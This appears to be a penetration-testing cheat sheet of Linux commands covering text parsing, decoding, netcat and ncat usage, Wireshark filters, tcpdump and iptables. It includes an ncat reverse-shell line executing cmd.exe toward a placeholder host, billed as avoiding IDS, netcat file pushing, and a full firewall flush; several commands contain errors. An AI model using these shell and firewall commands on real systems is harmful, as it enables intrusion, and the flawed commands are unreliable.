# Linux Commands

- Search for a file that contains a specific string in it's name
```
find / -name sbd\*
```
- Show active internet connections
```
netstat -lntp
```
- Verify a service is running and listening
```
netstat -antp | grep <service name>
```
- Unzipping a gz file
```
gunzip filename.gz
```
- Unzipping a tar.gz file
```
tar -xvzf filename.tar.gz
```
- **String manipulation**

  - count number of lines in a file
  ```
  wc -l file.txt
  ```
  - extract the lines that contain a string
  ```
  grep "href=" index.html
  ```
  - Split a string by a delimiter, filter results and then sort
  ```
  grep "href=" index.html | cut -d "/" -f 3 | grep "\\."  | cut -d '"' -f 1 | sort -u
  ```
  - Grep with regex
  ```
  cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort â€“u > list.txt
  ```
  - *Bash script to find IP address behind a host*
  ```
  for url in $(cat list.txt); do host $url; done
  ```
  - *Collect all the IP Addresses from a log file and sort by frequency*
  ```
  cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
  ```
- **Decoding**

  - Decode Base64 Encoded values
  ```
  echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode
  ```
  - Decode Hexadecimal Encoded Values
  ```
  echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps
  ```
- **Netcat**
  - Connect to a POP3 mail server
  ```
  nc -nv $ip 110
  ```
  - send a file using netcat
  ```
  nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe
  ```
  - Recieve a file using netcat
  ```
  nc -nvlp 4444 > incoming.exe
  ```
  - Netcat for banner grabbing
  ```
  echo "" | nc -nv -w1 $ip $port
  ```
- **Ncat** (Netcat for Nmap project which provides more security, avoid IDS)
  - Reverse shell with Ncat using bash on linux
  ```
  ncat --exec cmd.exe --allow $ip -nv1 4444 --ssl
  ```
- **Wireshark**

  - Show only SMTP (port 25) and ICMP traffic:
  ```
  tcp.port eq 25 or icmp
  ```
  - Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:
  ```
  ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16
  ```
  - Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:
  ```
  ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip
  ```
  - Some commands are equal
  ```
  ip.addr == xxx.xxx.xxx.xxx
  ```
  - Equals
  ```
  ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx
  ip.addr != xxx.xxx.xxx.xxx
  ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx
  ```
- **Tcpdump**
  - Display a pacp file
  ```
  tcpdump -r passwords.pcap
  ```
  - Display ips and filter and sort
  ```
  tcpdump -n -r passwords.pcap | awk -F" " '{print $3}' | sort -u | head
  ```
  - Grap a packet capture on port 80
  ```
  tcpdump tcp port 80 -w output.pcap -i eth0
  ```
  - Check for ACK or PSH flag set in TCP Pocket
  ```
  tcpdump -A -n 'tcp[13] = 24' -r passwords.pcap
  ```
- **IPTables**
  - deny traffic to ports except for local loopback
  ```
  iptables -A INPUT -p tcp --destination=port 13327 ! -d $ip -j DROP
  iptables -A INPUT -p tcp --destination=port 9991 ! -d $ip -j DROP
  ```
  - clear ALL Iptables firewall rules
  ```bash
  iptables -P INPUT ACCEPT
  iptables -P FORWARD ACCEPT
  iptables -P OUTPUT ACCEPT
  iptables -t nat -F
  iptables -t mangle -F
  iptables -F
  iptables -X
  iptables -t raw -F iptables -t raw -X
  ```
